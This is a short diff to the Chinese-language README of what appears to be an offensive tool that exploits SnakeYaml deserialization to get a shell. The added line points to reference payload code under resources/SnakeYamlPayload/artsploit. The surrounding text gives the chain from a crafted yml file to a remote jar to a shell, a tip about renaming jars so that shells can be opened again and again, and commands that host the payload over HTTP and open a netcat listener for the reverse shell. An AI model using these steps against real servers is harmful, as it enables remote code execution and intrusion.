@@ -281,6 +281,8 @@ SnakeYamlYml.yml - > SnakeYaml.jar - > getshell
 
 **小Tips**：该漏洞的yml文件调用jar包加载，若重复发送同名的jar包会导致漏洞利用失败，故该模块用了递增的形式一直改变生成jar包名而到达无限弹shell
 
+生成的jar包参考代码在resources/SnakeYamlPayload/artsploit下
+
 ```bash
 python -m http.server 80 
 nc -lvk 9950 #mac
